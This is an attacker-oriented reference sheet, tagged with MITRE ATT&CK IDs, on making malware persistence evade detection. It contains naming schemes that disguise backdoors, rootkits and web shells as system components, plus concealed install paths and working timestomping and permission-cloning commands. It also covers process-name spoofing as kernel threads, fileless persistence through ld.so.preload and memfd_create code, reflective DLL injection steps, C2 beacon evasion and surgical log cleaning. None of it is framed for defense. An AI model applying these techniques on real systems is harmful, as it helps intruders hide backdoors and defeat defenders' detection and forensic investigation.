# Stealth Persistence Reference

Techniques to make persistence mechanisms blend with legitimate system activity.
Apply these principles to any persistence technique. Cross-reference: T1036 (Masquerading), T1070.006 (Timestomp).

---

## Naming Conventions — T1036.004, T1036.005
Mimic legitimate services. Never use obvious names.

| Bad Name | Good Name | Rationale |
|---|---|---|
| backdoor.sh | update-manager | Package manager helper |
| payload.exe | svchost-helper.exe | Windows service host |
| evil.service | systemd-resolved-helper.service | Systemd naming pattern |
| shell.php | class-wp-xmlrpc.php | WordPress file pattern |
| rootkit.ko | e1000e_helper.ko | Network driver module |

**Linux patterns:** `*-helper`, `*-daemon`, `update-*`, `sys*`, `dbus-*`
**Windows patterns:** `Windows*Helper`, `*UpdateSvc`, `Microsoft*Agent`

## File Placement — T1036.005
Hide in directories not commonly inspected.

**Linux — good locations:**
```
/usr/lib/update-notifier/       # Package manager helpers
/usr/lib/systemd/               # Systemd components
/usr/libexec/                   # System executables
/opt/microsoft/                 # Third-party software
/var/lib/dpkg/info/             # Package metadata
```
Avoid: `/tmp/`, `/home/`, `/root/` — commonly monitored, cleaned on reboot.

**Windows — good locations:**
```
C:\ProgramData\Microsoft\       # Microsoft app data
C:\Windows\System32\Tasks\      # Scheduled task definitions
C:\Program Files\Common Files\  # Shared components
```

## Timestamp Matching — T1070.006
```bash
# Linux: match timestamp to system file
touch -r /usr/bin/cron /usr/lib/update-helper/svc
touch -r /lib/systemd/systemd /etc/systemd/system/update-helper.service
touch -t 202301150830 /usr/lib/update-helper/svc
```
```powershell
# Windows
(Get-Item "C:\ProgramData\update\svc.exe").CreationTime = "01/15/2023 08:30:00"
(Get-Item "C:\ProgramData\update\svc.exe").LastWriteTime = "01/15/2023 08:30:00"
```

## Permission Matching
```bash
chmod --reference=/usr/lib/systemd/systemd /usr/lib/update-helper/svc
chown --reference=/usr/lib/systemd/systemd /usr/lib/update-helper/svc
stat /usr/lib/systemd/systemd  # check reference
```

## Process Naming — T1036.003
```bash
# Linux: exec with new argv[0]
exec -a "[kworker/0:2-events]" /usr/lib/update-helper/svc
# C payload: prctl(PR_SET_NAME, "kworker/0:2", 0, 0, 0);
```
Good names: `[kworker/u:1]`, `[migration/0]`, `[watchdog/0]`, `/usr/sbin/rsyslogd`
Windows: `svchost.exe`, `RuntimeBroker.exe`, `SearchProtocolHost.exe`

## Memory-Only Persistence (Fileless)

**LD_PRELOAD + tmpfs (Linux):**
```bash
gcc -shared -fPIC -o /dev/shm/.helper.so payload.c -ldl
echo "/dev/shm/.helper.so" >> /etc/ld.so.preload
# /dev/shm cleared on reboot — combine with boot-time recreator
```

**memfd_create (Linux 3.17+):**
```c
int fd = memfd_create("", MFD_CLOEXEC);
write(fd, elf_payload, payload_len);
fexecve(fd, argv, envp);
// No filesystem entry. Anonymous file in memory.
```

**Reflective DLL Injection (Windows):**
1. `VirtualAllocEx` in target process
2. `WriteProcessMemory` with DLL content
3. `CreateRemoteThread` pointing to reflective loader
4. No DLL on disk, no `LoadLibrary` call in logs

## Network Stealth
- **Jitter:** Randomize callback intervals (4-7 min, not exact 5 min)
- **DNS beaconing:** TXT queries blend with legitimate DNS traffic
- **Domain fronting:** Route C2 through legitimate CDNs (CloudFront, Azure CDN)
- **Protocol blending:** HTTPS to common domains, HTTP/2 multiplexing
- **Sleep:** Long sleep periods (hours) with event-triggered wake-up

## Anti-Forensics
- Use `shred -zu` instead of `rm` for sensitive files
- Avoid journaled filesystem writes when possible
- Log gaps and timeline gaps are themselves IoCs — clean surgically
